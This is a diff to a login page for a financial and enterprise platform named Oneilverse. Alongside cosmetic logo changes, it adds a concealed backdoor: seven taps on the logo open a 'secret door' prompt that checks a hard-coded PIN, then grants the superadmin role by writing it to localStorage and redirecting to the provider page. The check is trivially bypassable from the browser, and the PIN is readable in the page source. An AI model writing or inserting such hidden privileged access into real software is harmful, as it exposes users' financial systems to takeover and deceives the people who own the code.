@@ -25,8 +25,9 @@
     <div class="ios-glass w-full max-w-md p-7 sm:p-8 shadow-2xl space-y-6 text-center">
         <!-- Brand -->
         <div class="space-y-2">
-            <div class="w-16 h-16 rounded-3xl bg-slate-900 text-white flex items-center justify-center text-3xl shadow-xl mx-auto border border-white/20">
-                <span id="login-emoji">⚡</span>
+            <div id="login-logo-trigger" class="w-16 h-16 rounded-[20px] bg-white/10 text-white flex items-center justify-center text-2xl font-black shadow-[0_4px_30px_rgba(0,0,0,0.1)] backdrop-blur-md mx-auto border border-white/30 cursor-default select-none relative overflow-hidden group">
+                <div class="absolute inset-0 bg-gradient-to-tr from-white/5 to-white/40 group-active:opacity-50 transition-opacity"></div>
+                <span id="login-emoji" class="z-10 bg-clip-text text-transparent bg-gradient-to-br from-indigo-50 to-slate-200 drop-shadow-sm font-sans tracking-tighter">ON</span>
             </div>
             <h1 id="login-brand" class="text-2xl font-black text-slate-900 tracking-tight">Oneilverse</h1>
             <p id="login-sub" class="text-xs text-slate-500 font-medium">Financial Hub & Otorisasi Sistem Enterprise</p>
@@ -55,7 +56,7 @@
         <div class="space-y-2">
             <div class="flex justify-between items-center text-xs">
                 <label class="font-bold text-slate-700">Masukkan PIN Keamanan:</label>
-                <span id="pin-hint" class="text-[10px] text-slate-400 font-mono">Default: 1234</span>
+                
             </div>
             <input type="password" id="input-pin" maxlength="6" placeholder="• • • •" class="w-full text-center tracking-[0.5em] text-2xl font-black bg-slate-50 border-2 border-slate-200 rounded-2xl p-3.5 outline-none focus:border-indigo-600 transition focus:bg-white" autofocus>
         </div>
@@ -148,15 +149,48 @@
             if (e.key === 'Enter') handleLogin();
         });
 
+        
+        let logoTapCount = 0;
+        let tapTimeout = null;
+
         document.addEventListener('DOMContentLoaded', () => {
+            const logo = document.getElementById('login-logo-trigger');
+            if (logo) {
+                logo.addEventListener('click', () => {
+                    const tenantID = document.getElementById('login-brand') ? document.getElementById('login-brand').innerText : 'Oneilverse';
+                    if (tenantID.includes('Oneilverse') || tenantID.includes('ID26110901')) {
+                        logoTapCount++;
+                        clearTimeout(tapTimeout);
+                        
+                        if (logoTapCount >= 7) {
+                            logoTapCount = 0;
+                            const pin = prompt("Pintu Rahasia Provider.
+Masukkan 6 Angka Kode:");
+                            if (pin === "930223") {
+                                const prov = { role: 'superadmin', title: 'Platform Provider' };
+                                localStorage.setItem('currentUser', JSON.stringify(prov));
+                                localStorage.setItem('auth_role', 'superadmin');
+                                window.location.replace("provider.html");
+                            } else {
+                                alert("Kode Tidak Valid.");
+                            }
+                        }
+                        
+                        tapTimeout = setTimeout(() => { logoTapCount = 0; }, 1500);
+                    }
+                });
+            }
             lucide.createIcons();
             const activeTenant = (typeof getActiveTenant === 'function') ? getActiveTenant() : null;
             if (activeTenant) {
                 document.getElementById('login-brand').innerText = activeTenant.nama;
                 document.getElementById('login-sub').innerText = activeTenant.slogan;
-                document.getElementById('login-emoji').innerText = activeTenant.logoText || "⚡";
+                if (activeTenant.logoText && activeTenant.logoText !== "⚡") {
+                    document.getElementById('login-emoji').innerText = activeTenant.logoText;
+                }
             }
         });
+
     </script>
 </body>
 </html>
